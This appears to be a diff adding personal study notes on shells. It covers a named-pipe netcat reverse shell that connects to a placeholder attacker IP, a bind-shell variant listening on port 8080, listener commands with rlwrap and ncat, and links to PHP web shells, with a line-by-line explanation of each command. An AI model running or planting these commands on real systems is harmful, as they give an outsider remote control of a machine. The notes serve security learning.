@@ -1,0 +1,62 @@
+
+--------------------------------
+Pipe reverse shell
+--------------------------------
+
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
+
+Explanation of each command:
+
+'rm -f /tmp/f' - this removes any previosuly created 'pipes' to prvent conflictions.
+
+'mkfifo /tmp/f' - this creates the pipe, FIFO stands for first in, first out. it allows for two-way communication between proceses. in this context it acts as a conduit for input and output data.
+
+'cat /tmp/f' - this reads data from the pipe. it waits for input that can be sent through the pipe.
+
+'| bash -i 2>&1' - the output of the previous command is piped to a shell instance 'bash -i' which allows for commands to be executed interactively. '2>&1' redirects standard error to standard output, ensuring messages are sent back to attacker.
+
+'| nc ATTACKER_IP ATTACKER_PORT >/tmp/f' - this part pipes the shell's output through nc and to the attackers ip address and port.
+
+'>/tmp/f' - this final part sends the output of the commands back into the named pipe allowing for bi-directional communication.
+
+
+--------------------------------
+Pipe bind shell
+--------------------------------
+
+Similar to the previous shell, there is something named a bind shell which instead of sending a connection to an attacker who is waiting for a response, it listens on a specific port for the attacker's signal. 
+
+The command structure is the exact same expect the final part where instead of 'nc ATTACKER_IP ATTACKER_PORT' it uses 'nc -l 0.0.0.0 PORT_NUMBER'
+
+!!!!RUNNING A LISTENER ON ANY PORT BELOW 1024 REQUIRES SUDO PERMISSIONS!!!!
+
+# Example:
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+
+
+
+--------------------------------
+Better shell tools
+--------------------------------
+
+In the previous examples, we used a pretty basic tool, netcat. However, netcat can either be replaced or built on to provide a better experience.
+
+# rlwrap
+# rlwrap is used with netcat to allow for the use of arrow keys for history to provide a better shell
+
+# use this instead
+rlwrap nc -lvnp 1337
+
+# ncat is a much improved version of netcat made by nmap and it allows for things such as ssl
+ncat -lvnp 1337
+ncat --ssl -lvnp 1337
+
+
+
+Some more advanced php shells:
+
+https://github.com/flozz/p0wny-shell
+
+https://github.com/b374k/b374k
+
+https://www.r57shell.net/single.php?id=13
